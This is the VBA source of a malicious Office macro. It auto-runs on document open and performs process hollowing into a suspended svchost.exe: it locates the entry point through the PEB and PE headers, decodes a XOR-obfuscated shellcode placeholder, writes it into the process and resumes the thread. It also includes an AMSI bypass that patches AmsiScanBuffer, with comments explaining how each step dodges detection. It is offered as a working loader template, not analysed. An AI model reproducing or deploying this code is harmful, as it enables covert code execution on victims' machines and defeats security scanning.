Private Declare PtrSafe Function ZwQueryInformationProcess Lib "NTDLL" (ByVal hProcess As LongPtr, ByVal procInformationClass As Long, ByRef procInformation As PROCESS_BASIC_INFORMATION, ByVal ProcInfoLen As Long, ByRef retlen As Long) As Long
Private Declare PtrSafe Function CreateProcessA Lib "KERNEL32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFOA, lpProcessInformation As PROCESS_INFORMATION) As LongPtr
Private Declare PtrSafe Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal dwSize As Long, ByVal lpNumberOfBytesRead As Long) As Long
Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long
Private Declare PtrSafe Function ResumeThread Lib "KERNEL32" (ByVal hThread As LongPtr) As Long
Private Declare PtrSafe Sub RtlZeroMemory Lib "KERNEL32" (Destination As STARTUPINFOA, ByVal Length As Long)
Private Declare PtrSafe Function GetProcAddress Lib "KERNEL32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
Private Declare PtrSafe Function LoadLibraryA Lib "KERNEL32" (ByVal lpLibFileName As String) As LongPtr
Private Declare PtrSafe Function VirtualProtect Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
Private Declare PtrSafe Function CryptBinaryToStringA Lib "CRYPT32" (ByRef pbBinary As Any, ByVal cbBinary As Long, ByVal dwFlags As Long, ByRef pszString As Any, pcchString As Any) As Long

Private Type PROCESS_BASIC_INFORMATION
 Reserved1 As LongPtr
 PebAddress As LongPtr
 Reserved2 As LongPtr
 Reserved3 As LongPtr
 UniquePid As LongPtr
 MoreReserved As LongPtr
End Type

Private Type STARTUPINFOA
 cb As Long
 lpReserved As String
 lpDesktop As String
 lpTitle As String
 dwX As Long
 dwY As Long
 dwXSize As Long
 dwYSize As Long
 dwXCountChars As Long
 dwYCountChars As Long
 dwFillAttribute As Long
 dwFlags As Long
 wShowWindow As Integer
 cbReserved2 As Integer
 lpReserved2 As String
 hStdInput As LongPtr
 hStdOutput As LongPtr
 hStdError As LongPtr
End Type
Private Type PROCESS_INFORMATION
 hProcess As LongPtr
 hThread As LongPtr
 dwProcessId As Long
 dwThreadId As Long
End Type

Sub Document_Open()
 xupload
End Sub
Sub AutoOpen()
 xupload
End Sub

' Function to disable AMSI
Function amupload()
 Dim AmsiDLL As LongPtr
 Dim UacInit As LongPtr
 Dim AmsiScanBuf As LongPtr
 AmsiDLL = LoadLibraryA(Chr(97) + Chr(109) + Chr(115) + "i" + "." + "dl" + "l")
 ' Get address of AmsiUacInitialize instead of AmsiScanBuffer to avoid flagging AMSI
 UacInit = GetProcAddress(AmsiDLL, "AmsiUacInitialize")
 ' Subtract 352 bytes to get beginning of AmsiScanBuffer
 AmsiScanBuf = UacInit - 352
 ' Use VirtualProtect to make the memory page writable
 res = VirtualProtect(AmsiScanBuf, 6, 64, 0)
 ' Bytes for xor eax, eax; ret
 Dim patch_bytes As Long
 patch_bytes = &HC3C031
 Dim size1 As Long
 size1 = 3
 ' Use CryptBinaryToStringA instead of RtlMoveMemory to copy bytes without flagging AMSI
 res = CryptBinaryToStringA(ByVal VarPtr(patch_bytes), ByVal 3, ByVal 2, ByVal AmsiScanBuf, ByVal VarPtr(size1))
 ' After this, AMSI will be disabled since AmsiScanBuffer will always return 0
End Function

' Performs process hollowing to run shellcode in svchost.exe
Function xupload()
 Dim si As STARTUPINFOA
 RtlZeroMemory si, Len(si)
 si.cb = Len(si)
 si.dwFlags = &H100
 Dim pi As PROCESS_INFORMATION
 Dim procOutput As LongPtr
 ' Start svchost.exe in a suspended state
 procOutput = CreateProcessA(vbNullString, "C:\\Windows\\System32\\svchost.exe", ByVal 0&, ByVal 0&, False, &H4, 0, vbNullString, si, pi)
 
 Dim ProcBasicInfo As PROCESS_BASIC_INFORMATION
 Dim ProcInfo As LongPtr
 ProcInfo = pi.hProcess
 zwOutput = ZwQueryInformationProcess(ProcInfo, 0, ProcBasicInfo, 48, 0)
 
 Dim PEBinfo As LongPtr
 PEBinfo = ProcBasicInfo.PebAddress + 16
 Dim AddrBuf(7) As Byte
 Dim tmp As Long
 tmp = 0
 ' Read 8 bytes of PEB to obtain base address of svchost in AddrBuf
 readOutput = ReadProcessMemory(ProcInfo, PEBinfo, AddrBuf(0), 8, tmp)
 ' Take the 8 bytes from AddrBuf and restore them to get the full base address of svchost
 svcHostBase = AddrBuf(7) * 2^ ^ 56
 svcHostBase = svcHostBase + AddrBuf(6) * (2^ ^ 48)
 svcHostBase = svcHostBase + AddrBuf(5) * (2^ ^ 40)
 svcHostBase = svcHostBase + AddrBuf(4) * (2^ ^ 32)
 svcHostBase = svcHostBase + AddrBuf(3) * (2^ ^ 24)
 svcHostBase = svcHostBase + AddrBuf(2) * (2^ ^ 16)
 svcHostBase = svcHostBase + AddrBuf(1) * (2^ ^ 8)
 svcHostBase = svcHostBase + AddrBuf(0)
 Dim data(512) As Byte
 ' Read more data from PEB so e_lfanew offset can be retrieved
 readOutput2 = ReadProcessMemory(ProcInfo, svcHostBase, data(0), 512, tmp)
 
 ' Read e_lfanew offset value and add 40
 Dim e_lfanew_offset As Long
 e_lfanew_offset = data(60)
 Dim opthdr As Long
 opthdr = e_lfanew_offset + 40
 ' Construct relative virtual address for svchost's entry point
 Dim entrypoint_rva As Long
 entrypoint_rva = data(opthdr + 3) * (2^ ^ 24)
 entrypoint_rva = entrypoint_rva + data(opthdr + 2) * (2^ ^ 16)
 entrypoint_rva = entrypoint_rva + data(opthdr + 1) * (2^ ^ 8)
 entrypoint_rva = entrypoint_rva + data(opthdr)
 Dim addressOfEntryPoint As LongPtr
 ' Add base address of svchost with the entry point RVA to get the start of the buffer to overwrite with shellcode
 addressOfEntryPoint = entrypoint_rva + svcHostBase
 
 ' Buffer for malicious crypted shellcode needs to go here at SHELLCODE_HERE
 Dim pak As Variant
  pak = Array(SHELLCODE_HERE)
 ' Decrypt shellcode
 For x = 0 To UBound(pak)
  pak(x) = (pak(x) - 7) Xor 2
 Next x

 ' Fix any shellcode bytes that ended up as negative values and cast them as Bytes
 Dim buf(SHELLCODE_LENGTH) As Byte
 For y = 0 To UBound(pak)
  If pak(y) < 0 Then
   pak(y) = 256 + pak(y)
  End If
  Dim b As Byte
  buf(y) = pak(y)
 Next y
 
 ' Write the shellcode into the svchost.exe entry point
 a = WriteProcessMemory(ProcInfo, addressOfEntryPoint, buf(0), SHELLCODE_LENGTH, tmp)
 ' Resume svchost.exe process to run the shellcode
 b = ResumeThread(pi.hThread)
 
End Function




